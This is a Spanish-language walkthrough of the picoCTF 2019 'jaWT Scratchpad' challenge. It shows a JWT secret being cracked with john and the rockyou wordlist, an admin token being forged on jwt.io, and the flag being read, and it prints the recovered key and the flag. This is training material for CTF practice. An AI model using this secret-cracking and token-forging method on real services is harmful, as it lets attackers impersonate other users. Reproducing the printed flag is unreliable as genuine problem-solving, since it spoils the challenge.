# jaWT Scratchpad

Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/61864/` or http://jupiter.challenges.picoctf.org:61864

Hints:
- What is that cookie?
- Have you heard of JWT?

## Solución
[JWT](https://jwt.io/)

Vemos que al logear nos genera un token JWT, al conocer la estructura de generacion podremos modificarlo para hacernos pasar por admin, pero no es tan sencillo, con la herramienta john vamos a obtener la key de la certificacion
Primero creamos un archivo token y a ese archivo le pasamos el contenido del token que nos genera al logearnos
```bash
┌──(kali㉿kali)-[~/…/Actividades/PicoCTF-2019/WEB/JaWT]
└─$ nano token
```
Queda algo asi
```bash
┌──(kali㉿kali)-[~/…/Actividades/PicoCTF-2019/WEB/JaWT]
└─$ cat token                
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWxkbyJ9.kYUzePfjodCreyYoc4wSN0sf4ypRmuKRsjJfo9jOy1c
```
Ahora nos vamos a la siguiente ruta
```bash
┌──(kali㉿kali)-[~]
└─$ cd /usr/share/wordlists 
```
Aqui se encuentra un archivo con el nombre rockyou.txt.gz, este archivo contiene las contraseñas que han sido hackeadas
Lo descomprimimos
```bash
┌──(kali㉿kali)-[/usr/share/wordlists]
└─$ sudo gzip -d rockyou.txt.gz
[sudo] password for kali: 
 
```
Ahora nos regresamos a donde tenemos el token y usamos la herramienta john para que pruebe palabra por palabra y nos de la key que necesitamos
```bash
┌──(kali㉿kali)-[~/…/Actividades/PicoCTF-2019/WEB/JaWT]
└─$ john token -w=/usr/share/wordlists/rockyou.txt
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)     
1g 0:00:00:03 DONE (2022-05-24 19:34) 0.2762g/s 2043Kp/s 2043Kc/s 2043KC/s iloverob4live345..ilovemymother@
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Nos dice que lo que buscamos es **ilovepico** 
Podemos ir a jwt.io que nos genera el token (el enlace esta en la seccion Referencias)
Si usamos el usuario admin y ponemos la key ilovepico nos generara algo asi
```jwt
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s
```
El header es asi
```jwt
{
  "typ": "JWT",
  "alg": "HS256"
}
```
El payload es asi
```jwt
{
  "user": "admin"
}
```
y el verify signature asi
```jwt
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  
)
```

```
## Hello admin!

Here is your JaWT scratchpad!

picoCTF{jawt_was_just_what_you_thought_1ca14548}
```